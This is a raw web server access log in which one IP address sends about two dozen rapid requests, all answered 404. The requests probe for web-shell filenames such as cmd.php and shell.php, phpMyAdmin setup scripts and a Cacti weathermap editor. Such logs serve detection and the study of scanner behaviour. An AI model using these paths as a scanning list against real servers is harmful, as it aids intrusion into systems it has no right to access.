61.36.230.35 - - [06/Oct/2018:10:14:49 +0000] "GET /knal.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /cmd.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /shell.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /appserv.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /scripts/setup.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /phpMyAdmin/scripts/db___.init.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /plugins/weathermap/editor.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "GET /cacti/plugins/weathermap/editor.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /wuwu11.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /xw.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /xw1.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /9678.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /wc.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /xx.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:50 +0000] "POST /s.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /w.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /sheep.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /qaq.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /db.init.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /db_session.init.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /db__.init.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
61.36.230.35 - - [06/Oct/2018:10:14:51 +0000] "POST /wp-admins.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
